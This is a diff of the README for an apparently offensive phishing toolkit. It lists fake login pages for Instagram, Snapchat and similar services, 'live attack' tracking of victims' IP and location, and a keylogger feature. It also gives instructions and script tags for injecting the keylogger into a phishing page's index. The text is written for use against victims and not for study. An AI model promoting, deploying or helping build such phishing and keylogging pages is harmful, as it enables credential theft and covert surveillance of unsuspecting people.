@@ -12,155 +12,63 @@
  
 </p>
 
-### PREREQUISITES ( Please verify if you have installed )
 
+### DEVELOPERS:-
+1) UNDEADSEC (https://github.com/UndeadSec)
+2) USAMA ABDUL SATTAR (https://github.com/usama7628674)
+3) ANONUD4Y (https://github.com/An0nUD4Y)
+4) Artur Tretiak (https://github.com/sTiKyt)
+5) Micrafast (https://github.com/Micrafast)
+6) ___________ (WAITING FOR YOU)
+
+## CREDIT:-
+* Usama ( A Most active Developer)
+* Anonud4y ( I can't remember if i have done Anything )
+* Artur ( Guy Who recustomized everything )
+* UNDEADSEC (For His wonderful repo socialfish which motivated us a lot)
+* TheLinuxChoice ( For The ideas from his repo Shellphish )
+
+### TESTED ON FOLLOWING:-
+* **Kali Linux - Rolling Edition**
+* **Parrot OS - Rolling Edition**
+* **Linux Mint - 18.3 Sylvia**
+* **Ubuntu - 16.04.3 LTS**
+* **MacOS High Sierra**
+* **Arch Linux**
+* **Manjaro XFCE Edition 17.1.12**
+* **Black Arch**
+
+### PREREQUISITES ( Please verify if you have installed )
 * Python 3
 * Wget from Python
 * PHP
 * sudo
 
+### WHAT'S NEW FEATURES
+**1) LIVE ATTACK**
+- Now you will have live information about the victims such as : IP ADDRESS, Geolocation, ISP, Country, & many more.
 
-### TESTED ON FOLLOWING
-* **Kali Linux - Rolling Edition**
+**2) COMPATIBILITY**
+- All the sites are mobile compatible.
 
-* **Parrot OS - Rolling Edition**
+**3) KEYLOGGER**
+- Now you will also have the ability to capture all the keystokes of victim.
 
-* **Linux Mint - 18.3 Sylvia**
+**(CURRENTLY):- This feature is added on instagram web page and github, to less the possibility of slow functioning of generated link)
 
-* **Ubuntu - 16.04.3 LTS**
+**HOW TO ADD IT MANUALLY ?
+-- You can add this manually by putting the codes on index page.(put these code at anywhere inside the index page // but not between any other script codes)
 
-* **MacOS High Sierra**
+```
+<script src="keylogger.js"></script>
+<script src="keylogger.php"></script>
 
-* **Arch Linux**
-
-* **Manjaro XFCE Edition 17.1.12**
-
-* **Black Arch**
-
-
-## HOW TO INSTALL
-
+```
 ### CLONE
 ```
 git clone https://github.com/DarkSecDevelopers/HiddenEye.git
 ```
-
-### RUNNING (In Linux)
-
-```
-cd HiddenEye
-```
-
-```
-sudo apt install python3-pip
-```
-
-```
-sudo pip3 install -r requirements.txt
-```
-
-```
-chmod 777 HiddenEye.py
-```
-
-```
-python3 HiddenEye.py
-
-```
-   OR
-   
-```
-./HiddenEye.py    
-
-```
-### RUNNING (If distro based on Arch Linux)
-
-```
-cd HiddenEye
-```
-
-```
-sudo pacman -Syu
-```
-```
-sudo pacman -S python-pip
-```
-
-```
-sudo pip3 install -r requirements.txt
-```
-
-```
-chmod 777 HiddenEye.py
-```
-
-```
-python3 HiddenEye.py
-
-```
-   OR
-   
-```
-./HiddenEye.py    
-
-```
-
-### RUNNING (For Android users in Termux)
-
-```
-First install { Termux } from Playstore.
-
-```
-
-```
-After opening Follow below commands One by one
-
-```
-
-```
-pkg install git python php curl openssh grep
-
-```
-```
-pip3 install wget
-
-```
-```
-git clone https://github.com/DarkSecDevelopers/HiddenEye.git
-
-```
-```
-cd HiddenEye
-
-```
-```
-chmod 777 HiddenEye.py
-
-```
-```
-python HiddenEye.py
-
-or
-
-./HiddenEye.py
-
-```
-### Running (One Code installation in Termux)
-
-
-```
-First install { Termux } from Playstore.
-
-```
-
-```
-After opening Copy and run this Single Command.
-
-```
-```
-pkg install git python php curl openssh grep && pip3 install wget && git clone https://github.com/DarkSecDevelopers/HiddenEye && cd HiddenEye && chmod 777 HiddenEye.py && python HiddenEye.py
-
-```
+## FOR FURTHER INSTALLATION PROCEDURE - (CHECK INSTRUCTIONS)
 
 ## AVAILABLE PAGES
 
@@ -191,30 +99,7 @@ pkg install git python php curl openssh grep && pip3 install wget && git clone h
 
 **+ Instagram:**
 - Traditional Instagram login page.
-- Instagram Autoliker Phishing Page [ ADVANCED METHOD ADOPTED ].
-
-### WHAT'S NEW FEATURES
-**1) LIVE ATTACK**
-- Now you will have live information about the victims such as : IP ADDRESS, Geolocation, ISP, Country, & many more.
-
-**2) COMPATIBILITY**
-- All the sites are mobile compatible.
-
-**3) KEYLOGGER**
-- Now you will also have the ability to capture all the keystokes of victim.
-
-**(CURRENTLY):- This feature is added on instagram web page and github, to less the possibility of slow functioning of generated link)
-
-**HOW TO ADD IT MANUALLY ?
--- You can add this manually by putting the codes on index page.(put these code at anywhere inside the index page // but not between any other script codes)
-
-```
-<script src="keylogger.js"></script>
-<script src="keylogger.php"></script>
-
-```
-
-
+- Instagram Autoliker Phishing Page.
 
 ### NEW PAGES
 <p align="center">
@@ -227,7 +112,7 @@ pkg install git python php curl openssh grep && pip3 install wget && git clone h
         
  **2) INSTAGRAM PHISHING:**
  - Traditional Login Page
- - Fake instagram Autoliker Page [ REDIRECTS TO ORIGINAL AUTOLIKER PAGE AFTER SUBMIT ] 
+ - Fake instagram Autoliker Page
 
  **3) SNAPCHAT PHISHING:**
  - Traditional Snapchat Login Page
